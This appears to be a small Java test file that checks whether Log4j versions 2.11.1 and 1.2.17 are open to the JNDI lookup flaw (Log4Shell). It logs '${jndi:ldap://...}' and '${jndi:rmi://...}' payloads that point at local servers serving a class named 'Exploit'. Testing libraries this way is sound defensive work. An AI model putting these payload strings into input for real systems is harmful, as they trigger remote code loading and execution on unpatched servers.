/**
 * Created by hk on 2021/12/10.
 */


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class Log4jTest {
    private static Logger LOG = LogManager.getLogger(Log4jTest.class);
    public static void main(String[] args) throws Exception {
        LOG.error("${jndi:ldap://127.0.0.1:11389/Exploit}");
        LOG.error("${jndi:rmi://127.0.0.1:11099/Exploit}");
        System.out.println("2.11.1");
    }
}

/*
import org.apache.log4j.BasicConfigurator;
import org.apache.log4j.Logger;
public class Log4jTest {
    private static Logger log = Logger.getLogger(Log4jTest.class);
    public static void main(String[] args) throws Exception {
        BasicConfigurator.configure();
        log.error("${jndi:ldap://127.0.0.1:8080/Exploit}");
        log.error("${jndi:rmi://127.0.0.1:8080/Exploit}");
        System.out.println("1.2.17");
    }
}
*/
